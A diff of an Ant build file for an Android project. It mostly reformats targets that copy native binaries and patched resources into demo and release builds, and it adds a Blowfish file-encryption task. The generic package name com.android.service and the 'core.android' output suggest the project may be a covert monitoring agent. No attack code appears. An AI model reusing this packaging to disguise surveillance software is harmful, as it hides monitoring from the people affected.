@@ -64,10 +64,10 @@
 				<filter token="DEMO" value="true" />
 			</filterset>
 		</copy>
-		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin"  overwrite="true"/>
-		<copy file="preprocess/resources.bin.patched" toFile="res/raw/resources.bin"  overwrite="true"/>
-		<copy file="libs/armeabi/statuslog" toDir="assets/"  overwrite="true"/>
-		<copy file="libs/armeabi/statusdb" toDir="assets/"  overwrite="true"/>
+		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
+		<copy file="preprocess/resources.bin.patched" toFile="res/raw/resources.bin" overwrite="true" />
+		<copy file="libs/armeabi/statuslog" toDir="assets/" overwrite="true" />
+		<copy file="libs/armeabi/statusdb" toDir="assets/" overwrite="true" />
 	</target>
 
 	<target name="set-release">
@@ -85,8 +85,8 @@
 				<filter token="DEMO" value="false" />
 			</filterset>
 		</copy>
-		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin"  overwrite="true"/>
-		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin"  overwrite="true"/>
+		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
+		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
 		<delete file="assets/statuslog" />
 		<delete file="assets/statusdb" />
 	</target>
@@ -106,8 +106,8 @@
 				<filter token="DEMO" value="true" />
 			</filterset>
 		</copy>
-		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin"  overwrite="true"/>
-		<copy file="preprocess/resources.bin.patched" toFile="res/raw/resources.bin"  overwrite="true"/>
+		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
+		<copy file="preprocess/resources.bin.patched" toFile="res/raw/resources.bin" overwrite="true" />
 		<delete file="assets/statuslog" />
 		<delete file="assets/statusdb" />
 	</target>
@@ -127,10 +127,10 @@
 				<filter token="DEMO" value="false" />
 			</filterset>
 		</copy>
-		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin"  overwrite="true"/>
-		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin"  overwrite="true"/>
-		<copy file="libs/armeabi/statuslog" toDir="assets/"  overwrite="true"/>
-		<copy file="libs/armeabi/statusdb" toDir="assets/"  overwrite="true"/>
+		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
+		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
+		<copy file="libs/armeabi/statuslog" toDir="assets/" overwrite="true" />
+		<copy file="libs/armeabi/statusdb" toDir="assets/" overwrite="true" />
 	</target>
 
 	<!--
@@ -209,14 +209,14 @@
 	</target>
 
 	<target name="htrelease" depends="clean, set-release, release">
-		<copy file="bin/android_service-unsigned.apk" toFile="bin/core.android" overwrite="true"/>
+		<copy file="bin/android_service-unsigned.apk" toFile="bin/core.android" overwrite="true" />
 		<echo message="bin/core.android" />
 	</target>
 
 	<target name="htdemo" depends="clean, set-demo, release">
 		<echo message="adb uninstall com.android.service" />
 		<echo message="adb install bin/android_service-release.apk" />
-		<copy file="bin/android_service-unsigned.apk" toFile="bin/core.android" overwrite="true"/>
+		<copy file="bin/android_service-unsigned.apk" toFile="bin/core.android" overwrite="true" />
 		<echo message="bin/core.android" />
 	</target>
 
@@ -224,22 +224,29 @@
 		<echo message="adb uninstall com.android.service" />
 		<echo message="adb install bin/android_service-release.apk" />
 	</target>
-	
+
 	<target name="dist" depends="htrelease">
-		 <input
-		    message="Version (7.3_RC1)?"
-		    addproperty="do.version"
-		 	defaultvalue="7.3_RC1"
-		  />
+		<input message="Version (7.3_RC1)?" addproperty="do.version" defaultvalue="7.3_RC1" />
 		<mkdir dir="../dist/${do.version}" />
-		<copy file="bin/core.android" toDir="../dist/${do.version}" overwrite="true"/>
-		<zip destfile="../dist/${do.version}/android_sources.zip" basedir="."/>
+		<copy file="bin/core.android" toDir="../dist/${do.version}" overwrite="true" />
+		<zip destfile="../dist/${do.version}/android_sources.zip" basedir="." />
 		<checksum>
-		  <fileset dir="../dist/${do.version}/">
-		    <include name="*"/>
-		  </fileset>
+			<fileset dir="../dist/${do.version}/">
+				<include name="*" />
+			</fileset>
 		</checksum>
-		
+
+	</target>
+
+	<taskdef name="crypter" classname="za.co.massdosage.ant.Crypter">
+		<classpath>
+			<pathelement path="${basedir}/../ant-libs/crypter-ant-1.0.0/lib/crypter-ant.jar" />
+		</classpath>
+	</taskdef>
+	<target name="cy" depends="">
+		<crypter keyFile="key.ser" generateKey="true" keyAlgorithm="Blowfish" />
+		<crypter encrypt="true" keyFile="key.ser" inputFile="Memo.txt" outputFile="encrypted.txt" cipherTransformation="Blowfish/CBC/PKCS5Padding" />
+
 	</target>
 
 </project>
